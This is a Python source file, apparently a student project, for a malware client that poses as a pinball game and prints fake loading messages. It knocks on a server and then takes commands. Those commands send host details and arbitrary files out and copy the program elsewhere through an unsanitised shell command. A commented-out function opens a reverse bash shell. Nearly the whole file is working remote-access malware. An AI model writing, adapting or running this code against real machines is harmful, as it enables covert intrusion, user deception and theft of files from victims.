# Jacob Coomer. This is a basic pinball game. 
# Just kidding, it is a malware client that connects to a server and receives commands.
# The commands it can receive are: sending information about the machine, sending a file, 
# closing the server, cloning the malware into another directory, and creating a reverse shell. 
# Dependencies: socket, time, platform, os, subprocess (for the shell). Tested on python3.9
# Execute with 'python3 pinball.py' in terminal

from socket import *
from time import *
import platform 
import os
from subprocess import run


ip = '127.0.0.1'
knockPort = 80
mainPort = 10001
shellPort = 10002
message = 'GET / HTTP/1.1\r\n\r\n'

# Primary Loop, post-knock
def mainConnection():
    connection = socket(AF_INET,SOCK_STREAM)
    connection.connect((ip, mainPort))
    while True:
        msg = connection.recv(4096).decode()
        if msg == 'CLOSE':
            connection.close()
            exit()
        else:
            handleCommand(msg,connection)

# The packet sent with a knock is meant to look like an HTTP Get Request.
# But its UDP, so maybe this is a bit obvious. 
def knock():
    print('Your pinball game is loading. Please do not close this window.')
    print('Loading pinball scores from leaderboard servers. Please do not close this window.')
    knockConnection = socket(AF_INET,SOCK_DGRAM)  
    knockConnection.sendto(message.encode(), (ip,knockPort))
    sleep(2)

# Start the correct method according to the protocol
def handleCommand(msg, connection):
    msg = msg.split(' ')
    if msg[0] == 'INFO':
        getInfo(connection)
    elif msg[0] == 'FILE':
        file = retrieveFile(msg[1])
        sendFile(connection, file)
    elif msg[0] == 'CLONE':
        cloneFile(connection, msg[1])
    # You can spawn a shell by starting an nc listener on the server machine.
    # elif msg[0] == 'SHELL': 
    #     spawnShell()

# Ensure a filepath is valid
def retrieveFile(path):
    try:
        file = open(path[1::], 'r')
        return file
    except:
        return None

# Gather and send information about the host
def getInfo(connection):
    response = 'Platform: ' + platform.platform() + '\n'
    response += 'Uname: ' + str(os.uname()) + '\n\n'
    response += 'Working Directory: ' + os.getcwd() + '\n'
    response += 'Result of ls in directory: \n' + os.popen('ls').read() + '\n'
    
    connection.send(response.encode())

#Process and transmit a valid file
def sendFile(connection, file):
    response = ''
    if file:
            for line in file.readlines():
                response += line + '\n'
    else:
        response = 'File not found.'
    connection.send(response.encode())

# Copy the malware to a different path on the machine    
def cloneFile(connection, path):
    try:
        os.system("cp ./pinball.py " + path)
        connection.send("Pinball copied.".encode())
    except:
        connection.send("Invalid path.".encode())
    
# def spawnShell():
#     shell=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     shell.connect((ip, shellPort))
#     os.dup2(shell.fileno(),0) 
#     os.dup2(shell.fileno(),1) 
#     os.dup2(shell.fileno(),2)
#     run(["/bin/bash","-i"])

    
knock()
mainConnection()


